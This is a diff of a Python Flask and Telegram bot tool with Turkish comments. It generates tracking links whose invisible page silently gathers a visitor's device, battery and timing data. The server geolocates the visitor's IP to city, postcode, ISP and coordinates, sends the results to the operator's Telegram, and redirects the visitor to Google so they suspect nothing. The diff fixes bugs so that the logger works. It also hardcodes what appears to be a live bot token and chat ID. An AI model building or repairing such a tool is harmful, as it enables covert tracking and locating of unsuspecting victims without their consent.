@@ -6,13 +6,12 @@ from threading import Thread
 
 app = Flask(__name__)
 
-# Telegram Bot Bilgilerin (Yeni ve Güncel Token Girişi Yapıldı)
+# Telegram Bot Bilgilerin
 TELEGRAM_TOKEN = '8704754477:AAE4ZDtCtyrcOC2mWHjKIKzxGXKMoK2MlAo'
 TELEGRAM_CHAT_ID = '7092481089'
 
 bot = telebot.TeleBot(TELEGRAM_TOKEN)
 
-# 1. TELEGRAM BOT KISMI: Kullanıcı /start verdiğinde butonlu premium panel mesajı gönderir
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     cevap_metni = """
@@ -29,17 +28,15 @@ Aşağıdaki butona tıklayarak hedef kullanıcıya göndereceğiniz özel veri 
     """
     
     markup = InlineKeyboardMarkup()
-    # Şık "Bağlantı Oluştur" butonu
     buton = InlineKeyboardButton(text="⚡ Bağlantı Oluştur 🔗", callback_data="link_olustur")
     markup.add(buton)
     
     bot.send_message(message.chat.id, cevap_metni, parse_mode='HTML', reply_markup=markup)
 
-# Kullanıcı butona bastığında çalışacak tetikleyici (Callback Query)
 @bot.callback_query_handler(func=lambda call: call.data == "link_olustur")
 def callback_inline(call):
-    # Senin özel Render linkin koda doğrudan gömüldü
-    hedef_link = "https://tg-logger-mq38.onrender.com" 
+    # BURAYA KENDİ GERÇEK RENDER LİNKİNİ YAZMALISIN (örn: https://tg-logger.onrender.com)
+    hedef_link = "https://tg-logger.onrender.com" 
     
     link_metni = f"""
 🚀 <b>ÖZEL BAĞLANTI BAŞARIYLA OLUŞTURULDU!</b>
@@ -53,7 +50,6 @@ def callback_inline(call):
     bot.send_message(call.message.chat.id, link_metni, parse_mode='HTML')
     bot.answer_callback_query(call.id, text="Bağlantı başarıyla üretildi!")
 
-# 2. WEB SUNUCUSU KISMI: Kullanıcı linke tıkladığında çalışan görünmez HTML arayüzü
 @app.route('/')
 def home():
     return """
@@ -74,13 +70,11 @@ def home():
             if (navigator.getBattery) {
                 try { const b = await navigator.getBattery(); pil = `%${Math.round(b.level * 100)}`; } catch(e){}
             }
-            // Verileri Flask backend sunucusuna postala
             fetch('/log', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({cihaz, cpuCekirdek: cpu, yerelSaat: saat, pilSeviyesi: pil})
             });
-            // Kullanıcıyı Google'a yönlendir (Şüphe çekmesin diye)
             setTimeout(() => { window.location.href = "https://google.com"; }, 800);
         }
         window.onload = verileriTopla;
@@ -89,14 +83,12 @@ def home():
     </html>
     """
 
-# Tarayıcıdan gelen kurban verileri yakalayıp Telegram'a gönderen endpoint
 @app.route('/log', methods=['POST'])
 def log_data():
     data = request.json or {}
     
-    # Gerçek IP adresini bulma algoritması
     if request.headers.getlist("X-Forwarded-For"):
-        client_ip = request.headers.getlist("X-Forwarded-For")
+        client_ip = request.headers.getlist("X-Forwarded-For")[0]
     else:
         client_ip = request.remote_addr or '8.8.8.8'
 
@@ -106,8 +98,8 @@ def log_data():
     pil_seviyesi = data.get('pilSeviyesi', 'Bilinmiyor')
 
     try:
-        # IP-API üzerinden coğrafi ve şirket verilerini çekme
-        geo_url = f"http://ip-api.com{client_ip}?fields=status,country,city,zip,org,lat,lon"
+        # DÜZELTME BURADA YAPILDI (/json/ eklendi)
+        geo_url = f"http://ip-api.com/json/{client_ip}?fields=status,country,city,zip,org,lat,lon"
         geo_res = requests.get(geo_url).json()
         
         ulke_sehir = "Bilinmiyor"
@@ -119,9 +111,10 @@ def log_data():
             ulke_sehir = f"{geo_res.get('country')} / {geo_res.get('city')}"
             posta_kodu = geo_res.get('zip', 'Yok')
             anonim_sirket = geo_res.get('org', 'Bilinmeyen Servis Sağlayıcı')
-            konum = f"{geo_res.get('lat')}, {geo_res.get('lon')}"
+            lat = geo_res.get('lat')
+            lon = geo_res.get('lon')
+            konum = f"{lat}, {lon}"
 
-        # Bota gönderilecek sistem bildirim mesajı (Panel tasarımı)
         telegram_mesaji = f"""
 🛑 <b>[!] YENİ BAĞLANTI AKTİVİTESİ YAKALANDI</b> 🛑
 ───────────────────────
@@ -134,12 +127,11 @@ def log_data():
 📮 <b>Posta Kodu:</b> <code>{posta_kodu}</code>
 🏢 <b>İnternet Sağlayıcı:</b> <code>{anonim_sirket}</code>
 🌐 <b>IP Adresi:</b> <code>{client_ip}</code>
-📍 <b>Harita Konumu:</b> <a href="https://google.com{konum}">Google Maps ile Göster</a>
+📍 <b>Harita Konumu:</b> <a href="https://www.google.com/maps/search/?api=1&query={konum}">Google Maps ile Göster</a>
 ───────────────────────
 🔍 <i>Veriler anlık ağ sorgusu üzerinden doğrulanmıştır.</i>
         """
 
-        # Raporu sadece senin CHAT_ID'ne gönderir
         bot.send_message(TELEGRAM_CHAT_ID, telegram_mesaji, parse_mode='HTML', disable_web_page_preview=True)
         return jsonify({"status": "success"}), 200
 
@@ -152,10 +144,8 @@ def run_bot():
     bot.infinity_polling()
 
 if __name__ == '__main__':
-    # Botu ve Web'i aynı onda çalıştırmak için thread başlatıyoruz
     bot_thread = Thread(target=run_bot)
     bot_thread.start()
     
     print("Web sunucusu 5000 portunda başlatılıyor...")
     app.run(host='0.0.0.0', port=5000, use_reloader=False)
-  
